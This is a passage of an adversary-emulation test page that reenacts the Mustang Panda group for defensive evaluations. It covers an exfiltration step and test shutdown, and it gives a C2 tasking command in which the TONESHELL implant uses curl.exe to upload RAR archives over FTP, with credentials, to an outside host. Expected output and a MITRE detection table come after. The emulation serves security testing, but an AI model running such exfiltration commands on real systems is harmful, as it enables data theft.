+<td><a href="https://unit42.paloaltonetworks.com/stately-taurus-attacks-se-asian-government/" class="outbound" target="_blank"><span>25</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://unit42.paloaltonetworks.com/stately-taurus-abuses-vscode-southeast-asian-espionage/" class="outbound" target="_blank"><span>26</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+</tbody>
+</table>
+</div>
+<doc-anchor-target id="step-3---exfiltration">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-3---exfiltration">#</doc-anchor-trigger>
+        <span>Step 3 - Exfiltration</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track-2">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track-2">#</doc-anchor-trigger>
+        <span>Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>After archiving files, Mustang Panda executes <code v-pre>curl.exe</code> to exfiltrate the RAR files to
+an adversary-controlled FTP server.</p>
+<doc-anchor-target id="procedures-3">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures-3">#</doc-anchor-trigger>
+        <span>Procedures</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Task TONESHELL to use <code v-pre>curl.exe</code> and exfiltrate the RAR files</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">python3 /opt/kalidev/mustang_panda/Resources/controlServer/evalsC2client.py --set-task 70d6b5c1105063b81d9ce95866793488 '{&quot;id&quot;: 5, &quot;taskNum&quot;: 4, &quot;args&quot;: &quot;curl.exe -T \&quot;{C:\\\\Windows\\\\Help\\\\Corporate\\\\67.rar,C:\\\\Windows\\\\Help\\\\Corporate\\\\69.rar,C:\\\\Windows\\\\Help\\\\Corporate\\\\70.rar,C:\\\\Windows\\\\Help\\\\Corporate\\\\71.rar,C:\\\\Windows\\\\Help\\\\Corporate\\\\72.rar}\&quot; ftp://ftp_user:Gracious-Coat@49.67.12.21/4/ --ftp-create-dirs&quot;}'</code></pre>
+</doc-codeblock></div>
+<ul>
+<li><p><em><strong>Expected Output</strong></em></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">[TASK] 2025/07/31 16:13:43
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  714k    0     0  100  714k      0  1198k --:--:-- --:--:-- --:--:-- 1198k
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 42.1M    0     0  100 42.1M      0  85.1M --:--:-- --:--:-- --:--:-- 85.1M
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 84.3M    0     0  100 84.3M      0  89.8M --:--:-- --:--:-- --:--:-- 89.8M
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 42.1M    0     0  100 42.1M      0  69.4M --:--:-- --:--:-- --:--:-- 69.4M
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 84.3M    0     0  100 84.3M      0  86.6M --:--:-- --:--:-- --:--:-- 86.6M
+</code></pre>
+</doc-codeblock></div>
+</li>
+</ul>
+</li>
+</ul>
+<doc-anchor-target id="reference-tables-2">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#reference-tables-2">#</doc-anchor-trigger>
+        <span>Reference Tables</span>
+    </h3>
+</doc-anchor-target>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Tactic</th>
+<th>Technique ID</th>
+<th>Technique Name</th>
+<th>Platform</th>
+<th>Detection Criteria</th>
+<th>Category</th>
+<th>Red Team Activity</th>
+<th>Hosts</th>
+<th>Users</th>
+<th>Source Code Links</th>
+<th>Relevant CTI Reports</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Exfiltration</td>
+<td>T1048.003</td>
+<td>Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol</td>
+<td>Windows</td>
+<td>waitfor.exe executed <code v-pre>curl.exe</code> to exfiltrate the RAR files over FTP to <code v-pre>49.67.12.21</code></td>
+<td>Calibrated - Not Benign</td>
+<td>TONESHELL uses <code v-pre>curl.exe</code> to exfiltrate the RAR files over FTP to <code v-pre>49.67.12.21</code></td>
+<td>bitterbridge (10.26.4.103)</td>
+<td>btully</td>
+<td><a href="../../resources/toneshell/src/shellcode/exec.cpp#L152-L239">PerformExecTask</a></td>
+<td><a href="https://jsac.jpcert.or.jp/archive/2023/pdf/JSAC2023_1_2_nick-sunny-vickie_en.pdf" class="outbound" target="_blank"><span>19</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://www.trendmicro.com/en_us/research/23/c/earth-preta-updated-stealthy-strategies.html" class="outbound" target="_blank"><span>21</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://unit42.paloaltonetworks.com/stately-taurus-attacks-se-asian-government/" class="outbound" target="_blank"><span>25</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+</tbody>
+</table>
+</div>
+<doc-anchor-target id="end-of-test">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#end-of-test">#</doc-anchor-trigger>
+        <span>End of Test</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track-3">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track-3">#</doc-anchor-trigger>
+        <span>Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>This step includes the shutdown procedures for the end of this Protections Test</p>
+<doc-anchor-target id="procedures-4">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures-4">#</doc-anchor-trigger>
+        <span>Procedures</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li>Return to the RDP to <code v-pre>bitterbridge (10.26.4.103)</code>. Close all windows and signout.</li>
+</ul>
+
+                                
+                                <!-- Required only on API pages -->
+                                <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
+                            </div>
+                            <footer id="retype-content-footer" class="clear-both">
+                            
+                                <nav id="retype-nextprev" class="print:hidden flex mt-14">
+                                    <div class="w-1/2">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../../enterprise/mustang_panda/emulation_plan/mustang_panda_alternative_steps/">
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                            <span>
+                                                <span class="block text-xs font-normal text-base-text-muted">Previous</span>
+                                                <span class="block mt-1">Mustang Panda Scenario Alternative Steps</span>
+                                            </span>
+                                        </a>
+                                    </div>
+                            
+                                    <div class="w-1/2">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../../enterprise/mustang_panda/emulation_plan/protections_test_5_scenario/">
+                                            <span>
+                                                <span class="block text-xs font-normal text-right text-base-text-muted">Next</span>
+                                                <span class="block mt-1">Protections Test 5 Scenario</span>
+                                            </span>
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                        </a>
+                                    </div>
+                                </nav>
+                            </footer>
+                        </main>
+                
+                        <div id="retype-page-footer" class="print:border-none border-t border-base-border pt-6 mb-8">
+                            <footer class="flex flex-wrap items-center justify-between print:justify-center">
+                                <div id="retype-footer-links" class="print:hidden">
+                                    <ul class="flex flex-wrap items-center text-sm">
+                                        <li>
+                                            <a class="inline-flex items-center mr-4 py-2 text-sm whitespace-nowrap transition-colors duration-200 ease-linear text-footer-link hover:text-footer-link-hover md:mb-0" href="https://github.com/attackevals/ael">
+                                                <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
+                                                    <g fill="currentColor">
+                                                        <path d="M12 1C5.923 1 1 5.923 1 12c0 4.867 3.149 8.979 7.521 10.436.55.096.756-.233.756-.522 0-.262-.013-1.128-.013-2.049-2.764.509-3.479-.674-3.699-1.292-.124-.317-.66-1.293-1.127-1.554-.385-.207-.936-.715-.014-.729.866-.014 1.485.797 1.691 1.128.99 1.663 2.571 1.196 3.204.907.096-.715.385-1.196.701-1.471-2.448-.275-5.005-1.224-5.005-5.432 0-1.196.426-2.186 1.128-2.956-.111-.275-.496-1.402.11-2.915 0 0 .921-.288 3.024 1.128a10.193 10.193 0 0 1 2.75-.371c.936 0 1.871.123 2.75.371 2.104-1.43 3.025-1.128 3.025-1.128.605 1.513.221 2.64.111 2.915.701.77 1.127 1.747 1.127 2.956 0 4.222-2.571 5.157-5.019 5.432.399.344.743 1.004.743 2.035 0 1.471-.014 2.654-.014 3.025 0 .289.206.632.756.522C19.851 20.979 23 16.854 23 12c0-6.077-4.922-11-11-11Z"/>
+                                                    </g>
+                                                </svg>
+                                                <span>ATTACK Evaluations Library GitHub</span>
+                                            </a>
+                                        </li>
+                                    </ul>
+                                </div>
+                                <div id="retype-copyright" class="print:justify-center py-2 text-footer-text font-footer-link-weight text-sm leading-relaxed"><p>© Copyright 2025. All rights reserved.</p></div>
+                            </footer>
+                        </div>
+                    </div>
+                
+                    <!-- Rendered if sidebar right is enabled -->
+                    <!-- Sidebar right skeleton-->
+                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-sidebar-right-bg border-sidebar-right-border lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton">
+                        <div class="pl-5">
+                            <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                            <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                            <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                        </div>
+                    </div>
+                
+                    <!-- User should be able to hide sidebar right -->
+                    <doc-sidebar-right v-cloak></doc-sidebar-right>
+                </div>
+
+            </div>
+        </div>
+    
+        <doc-search-mobile></doc-search-mobile>
+        <doc-back-to-top></doc-back-to-top>
+    </div>
+
+
+    <div id="retype-overlay-target"></div>
+
+    <script data-cfasync="false">window.__DOCS__ = { "title": "Protections Test 4 Scenario", level: 4, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
+</body>
+</html>
